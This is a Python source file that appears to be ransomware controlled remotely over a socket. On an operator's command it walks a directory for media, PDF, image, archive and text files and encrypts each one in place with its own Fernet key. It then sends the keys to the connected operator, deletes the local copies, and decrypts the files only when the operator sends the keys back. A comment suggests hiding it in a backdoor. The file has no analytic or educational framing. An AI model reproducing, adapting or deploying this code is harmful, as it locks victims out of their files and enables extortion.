import socket
import os, sys, time
from cryptography.fernet import Fernet

drivers_list = []
filesname = []
file_with_path = []
default_name_keyfolder = ("key_folder")
file_targert = [".mp4", ".mp3", ".pdf", ".jpg", ".png", ".zip", ".txt"]

def config():
    IP = socket.gethostname()
    PORT = 8080
    global server_socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((IP, PORT))
    server_socket.listen(5)
    print("[+] waiting for connection...")
    global conn
    conn, addr = server_socket.accept()
    print(f"[+] connection from {addr} has been etasblished!!!")

def generate_key(filename):
    key = Fernet.generate_key()
    key_pathname = filename + str(".key")
    with open(key_pathname, "wb") as file:
        file.write(key)
        file.close()

def load_key(filename):
    key_pathname = filename + str(".key")
    return open(key_pathname, "rb").read()

def encrypting_file(filepath, filename_only):
    file_to_load = os.path.splitext(filename_only)
    key = load_key(file_to_load[0])
    print(f"[+] Encrypting files in {filepath}....")
    f = Fernet(key)
    with open(filepath, "rb") as file:
        data = file.read()
    encrypted_data = f.encrypt(data)
    with open(filepath, "wb") as file:
        file.write(encrypted_data)
        file.close()

def decrypting_file(filepath, filename_only):
    file_to_load = os.path.splitext(filename_only)
    key = load_key(file_to_load[0])
    print(f"[+] Decrypting files in {filepath}....")
    f = Fernet(key)
    with open(filepath, "rb") as file:
        data = file.read()
    decrypted_data = f.decrypt(data)
    with open(filepath, "wb") as file:
        file.write(decrypted_data)
        file.close()

def gathering_files_decrypt(dirs):
    directory = dirs
    print("[+] gathering all files.....")
    for root, dirsname, files in os.walk(directory):
        for filename in files:
            if filename.endswith(file_targert[0]) or filename.endswith(file_targert[1]) or filename.endswith(file_targert[2]) or filename.endswith(file_targert[3]) or filename.endswith(file_targert[4]) or filename.endswith(file_targert[5]) or filename.endswith(file_targert[6]):
                filesname.append(filename)
                l = root + str("\\") + filename
                file_with_path.append(l)
    if os.path.exists(default_name_keyfolder) == True:
        get_list = os.listdir(default_name_keyfolder)
        os.chdir(default_name_keyfolder)
        for files in get_list:
            os.remove(files)
        os.chdir("..")
        os.removedirs(default_name_keyfolder)
    os.makedirs(default_name_keyfolder)
    os.chdir(default_name_keyfolder)
    print("[+] waiting for file ammount")
    ammount_data = conn.recv(4000)
    ammount_data = ammount_data.decode()
    ammount_data = int(ammount_data)
    print(f"[+] ammount file is {ammount_data}")
    counter = 0
    print("[+] preparing to receive all files....")
    time.sleep(2)
    while True:
        filename = conn.recv(3000)
        filename = filename.decode()
        buff_size = conn.recv(4000)
        buff_size = int(buff_size.decode())
        print(f"[+] receiving filename called {filename}....")
        with open(filename, "wb") as file:
            data = conn.recv(buff_size)
            file.write(data)
            file.close()
        counter += 1
        if counter == ammount_data:
            break
    print("[+] all files received!!!") 
    time.sleep(2)
    print("[+] decrypting all files....")
    for file_to_decrypt in file_with_path:
        filename_only = os.path.basename(file_to_decrypt)
        decrypting_file(file_to_decrypt, filename_only)
    confirmation = (b"the script has succesfully decrypt all files!")   # tingaal taruh di backdoor aja
    send_confirm = conn.send(confirmation)
    path = os.getcwd()
    list_dir = os.listdir(path)
    for files in list_dir:
        os.remove(files)
    os.chdir("..")
    os.removedirs(default_name_keyfolder)

def gathering_files(dirs):
    print("[+] looking for the file file target....")
    time.sleep(2)
    directory = dirs
    filesname = []
    file_with_path = []
    print("[+] gathering all found files to list.....")
    for root, dirsname, files in os.walk(directory):
        for filename in files:
            if filename.endswith(file_targert[0]) or filename.endswith(file_targert[1]) or filename.endswith(file_targert[2]) or filename.endswith(file_targert[3]) or filename.endswith(file_targert[4]) or filename.endswith(file_targert[5]) or filename.endswith(file_targert[6]):
                filesname.append(filename)
                l = root + str("\\") + filename
                file_with_path.append(l)
    if os.path.exists(default_name_keyfolder) == True:
        os.remove(default_name_keyfolder)
        os.makedirs(default_name_keyfolder)
        os.chdir(default_name_keyfolder)
    elif os.path.exists(default_name_keyfolder) == False:
        os.makedirs(default_name_keyfolder)
        os.chdir(default_name_keyfolder)
    print("[+] please be patient while making all files key....")
    for makes_file_key in filesname:
        makes_file_key = os.path.splitext(makes_file_key)
        generate_key(makes_file_key[0])
    print("[+] preparing to encrypting all files")
    time.sleep(2)
    for file_to_encrypt in file_with_path:
        data = os.path.basename(file_to_encrypt)
        encrypting_file(file_to_encrypt, data)
    path = os.getcwd()
    list_dir = os.listdir(path)
    file_length = len(list_dir)
    file_length = str(file_length)
    send_file_length = conn.send(file_length.encode())
    for files in list_dir:
        print(f"[+] sending keyname to the connector called {files}")
        filename_send = conn.send(files.encode())
        buff_size = os.path.getsize(files)
        sending1_buff_size = str(buff_size)
        time.sleep(2)
        print(f"[+] sending buff size for {files} file...")
        sending_buff_size = conn.send(sending1_buff_size.encode())
        sending_key(files)
    path = os.getcwd()
    get_list_key = os.listdir(path)
    os.chdir("..")
    for key in get_list_key:
        key_name = path + str("\\") + key
        os.remove(key_name)
    os.removedirs(default_name_keyfolder)

def sending_key(filename):
    print(f"[+] sending the file {filename}....")
    filename = filename                 
    with open(filename, "rb") as file:
        data_inside = file.read()
        sending_a_files = conn.send(data_inside)
        file.close()
    print("[+] files has been sended!!!")

def active(): 
    config()
    while True:
        command = conn.recv(4000)
        command = command.decode()
        if ("encrypt") in command:
            dirs = conn.recv(5000)
            dirs = dirs.decode()
            gathering_files(dirs)

        elif ("decrypt") in command:
            path = os.getcwd()
            gathering_files_decrypt(path)

        elif ("exit") in command:
            conn.close()
            server_socket.close()
            break

        else:
            continue
